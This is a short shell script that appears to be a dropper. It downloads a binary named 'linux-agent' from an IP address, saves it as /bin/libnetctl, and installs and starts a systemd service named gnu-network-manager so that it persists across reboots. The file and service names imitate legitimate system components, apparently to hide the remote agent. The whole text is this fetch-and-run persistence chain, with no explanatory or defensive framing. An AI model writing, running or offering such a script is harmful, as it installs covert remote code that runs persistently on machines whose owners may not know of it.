IP="192.168.1.1"

wget http://$IP/download/linux-agent -O /bin/libnetctl -o /dev/null
chmod 755 /bin/libnetctl
wget http://$IP/download/systemdfile -O /etc/systemd/system/gnu-network-manager.service -o /dev/null
chmod 644 /etc/systemd/system/gnu-network-manager.service

systemctl daemon-reload
systemctl enable gnu-network-manager
systemctl start gnu-network-manager